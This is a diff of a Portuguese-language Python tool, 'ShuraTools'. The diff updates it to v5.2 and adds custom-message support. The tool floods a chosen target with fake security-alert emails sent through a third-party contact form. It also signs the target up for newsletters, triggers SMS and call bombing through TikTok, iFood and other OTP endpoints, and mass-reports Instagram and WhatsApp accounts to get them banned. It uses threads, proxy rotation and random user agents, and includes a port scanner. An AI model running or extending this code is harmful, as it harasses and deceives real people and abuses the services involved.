@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
-Versão Pro v5.1 Black-Mamba (High Success Rate)
+Versão Pro v5.2 Black-Mamba Premium (Custom Message Support)
 """
 
 import os
@@ -38,7 +38,7 @@ BANNER = f"""
 {Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                        
 {Fore.YELLOW}  >> SpamMail | SMS/Call | Ban | OSINT | Scan <<
-{Fore.RED}       v5.1 Black-Mamba - by Shura
+{Fore.RED}    v5.2 Black-Mamba Premium - by Shura
 """
 
 LOCK = threading.Lock()
@@ -92,13 +92,15 @@ def run_threads(target_func, qty, threads):
         t.start(); ts.append(t); curr += take
     for t in ts: t.join()
 
-# ---------- Database de Endpoints (v5.1 Atualizada) ----------
-def get_endpoints(type, target):
+# ---------- Database de Endpoints (v5.2 Custom Message) ----------
+def get_endpoints(type, target, msg=None):
     if type == "email_fake":
+        m = msg if msg else f"Atenção: Atividade suspeita detectada na sua conta {os.urandom(3).hex()}. Verifique imediatamente."
+        subj = "Alerta de Seguranca" if not msg else "Notificacao Importante"
         return [
-            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": f"Olá, detectamos acesso indevido {os.urandom(3).hex()}", "subject": "Alerta de Seguranca"}},
-            {"url": "https://www.newsletter.com/subscribe", "data": {"email": target, "action": "subscribe"}},
-            {"url": "https://p.newsletter.vtex.com/subscribe", "data": {"email": target, "list": "netshoes"}}
+            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": m, "subject": subj}},
+            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": f"{m} [Ref: {os.urandom(2).hex()}]", "subject": "Suporte Tecnico"}},
+            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": m, "subject": "Urgente"}}
         ]
     elif type == "newsletter":
         return [
@@ -109,7 +111,6 @@ def get_endpoints(type, target):
             {"url": "https://oalgoritmo.substack.com/api/v1/free_signup", "data": {"email": target, "first_url": "https://oalgoritmo.substack.com/"}, "json": True}
         ]
     elif type == "sms_call":
-        # Removidos endpoints mortos, mantidos apenas os de alta entrega
         return [
             {"url": "https://www.tiktok.com/api/v1/auth/phone/send_code/", "data": {"mobile": target, "type": 1}, "json": True},
             {"url": "https://auth.ifood.com.br/v1/login/otp", "data": {"phone": target}, "json": True},
@@ -119,12 +120,12 @@ def get_endpoints(type, target):
         ]
     return []
 
-# ---------- Attack Engine (Otimizado) ----------
-def attack_engine(target, qty, threads, type, use_proxy=False):
+# ---------- Attack Engine ----------
+def attack_engine(target, qty, threads, type, use_proxy=False, msg=None):
     log(f"Iniciando {type.upper()} contra: {target}", "warn")
-    endpoints = get_endpoints(type, target)
+    endpoints = get_endpoints(type, target, msg)
     if not endpoints:
-        log("Nenhum endpoint disponível para este tipo.", "error")
+        log("Nenhum endpoint disponível.", "error")
         return
 
     def job(start, end):
@@ -133,12 +134,10 @@ def attack_engine(target, qty, threads, type, use_proxy=False):
             try:
                 proxies = get_proxy() if use_proxy else None
                 site = random.choice(endpoints)
-                
-                # Cabeçalhos inteligentes para cada site
                 headers = {
                     "User-Agent": random.choice(UA_LIST),
                     "Accept": "application/json, text/plain, */*",
-                    "Referer": site["url"].split("/create")[0] if "/create" in site["url"] else site["url"]
+                    "Referer": site["url"]
                 }
                 
                 if site.get("json"):
@@ -147,27 +146,26 @@ def attack_engine(target, qty, threads, type, use_proxy=False):
                     res = session.post(site["url"], data=site["data"], headers=headers, timeout=10, proxies=proxies)
                 
                 if res.status_code in [200, 201, 202, 204]:
-                    log(f"Req {i+1} -> SUCESSO via {site['url'].split('/')[2]}", "success")
+                    log(f"Ataque {i+1} -> OK ({site['url'].split('/')[2]})", "success")
                 else:
-                    log(f"Req {i+1} -> Falhou (Status {res.status_code})", "warn")
+                    log(f"Ataque {i+1} -> Block ({res.status_code})", "warn")
                 
-                # Delay randômico para não ser banido pelo IP do alvo
                 time.sleep(random.uniform(1.0, 3.0))
-            except Exception as e:
-                log(f"Req {i+1} -> Erro: Conexão interrompida", "error")
+            except:
+                log(f"Ataque {i+1} -> Erro de rede", "error")
                 
     run_threads(job, qty, threads)
 
-# ---------- Outras Ferramentas ----------
+# ---------- Ferramentas Sociais ----------
 def ban_report(target, qty, threads, platform="ig"):
-    log(f"Mass Report ({platform.upper()}) -> {target}", "error")
+    log(f"Enviando Mass Report ({platform.upper()}) para {target}...", "error")
     url = "https://i.instagram.com/api/v1/users/web_report/" if platform == "ig" else "https://v.whatsapp.net/v2/report"
     def job(start, end):
         for i in range(start, end):
             try:
                 data = {"username": target, "reason_id": "1"} if platform == "ig" else {"phone": target, "reason": "spam"}
                 requests.post(url, data=data, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
-                log(f"Report {i+1} enviado.", "success")
+                log(f"Report {i+1} disparado.", "success")
             except: pass
     run_threads(job, qty, threads)
 
@@ -177,15 +175,15 @@ def menu():
         try:
             clear()
             print(BANNER)
-            print(f"{Fore.CYAN}[ 1 ] Spam: Mensagens Falsas (E-mail)")
-            print(f"{Fore.CYAN}[ 2 ] Spam: Cadastrar Alvo em Newsletters (Sites Chatos)")
+            print(f"{Fore.CYAN}[ 1 ] Spam: Mensagem para Alvo (E-mail Custom)")
+            print(f"{Fore.CYAN}[ 2 ] Spam: Cadastrar em Newsletters (Sites Chatos)")
             print(f"{Fore.CYAN}[ 3 ] Bomber: SMS & Call (Chamada de Voz)")
             print(f"{Fore.CYAN}[ 4 ] Denuncia: Banir Instagram (Mass Report)")
             print(f"{Fore.CYAN}[ 5 ] Denuncia: Banir WhatsApp (Mass Report)")
             print(f"{Fore.WHITE}[ 6 ] OSINT: Social Profile Search")
             print(f"{Fore.WHITE}[ 7 ] Scan: Port Scanner de Rede")
-            print(f"{Fore.YELLOW}[ 8 ] Proxies: Atualizar Lista de Rotação")
-            print(f"{Fore.RED}[ 0 ] Sair do ShuraTools")
+            print(f"{Fore.YELLOW}[ 8 ] Proxies: Atualizar Lista")
+            print(f"{Fore.RED}[ 0 ] Sair")
             print("-" * 55)
             
             opt = input(f"{Fore.YELLOW}Escolha o Arsenal: {Style.RESET_ALL}").strip()
@@ -195,7 +193,9 @@ def menu():
                 target = input(f"{Fore.YELLOW}Digite o Alvo: {Style.RESET_ALL}").strip()
                 if not target: continue
                 
-                if opt == "1": attack_engine(target, safe_int("Qtd (10): ", 10), 5, "email_fake")
+                if opt == "1":
+                    msg = input(f"{Fore.YELLOW}Mensagem Customizada (Enter para padrão): {Style.RESET_ALL}").strip()
+                    attack_engine(target, safe_int("Qtd (10): ", 10), 5, "email_fake", msg=msg)
                 elif opt == "2": attack_engine(target, safe_int("Qtd (20): ", 20), 5, "newsletter")
                 elif opt == "3": attack_engine(target, safe_int("Qtd (15): ", 15), 2, "sms_call")
                 elif opt == "4": ban_report(target, safe_int("Qtd (50): ", 50), 10, "ig")
@@ -216,7 +216,7 @@ def menu():
                             s.close()
                     except: log("Alvo inacessível.", "error")
                 
-                input(f"\n{Fore.GREEN}Operação finalizada. ENTER para voltar...{Style.RESET_ALL}")
+                input(f"\n{Fore.GREEN}Operação concluída. ENTER para voltar...{Style.RESET_ALL}")
             elif opt == "8":
                 r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all")
                 for line in r.text.splitlines():
@@ -224,7 +224,7 @@ def menu():
                 log(f"{PROXY_QUEUE.qsize()} proxies carregadas.", "success"); input("\nENTER...")
         except KeyboardInterrupt: break
         except Exception as e:
-            log(f"Falha Crítica: {e}", "error"); input("\nENTER para resetar...")
+            log(f"Erro: {e}", "error"); input("\nENTER...")
 
 if __name__ == "__main__":
     menu()
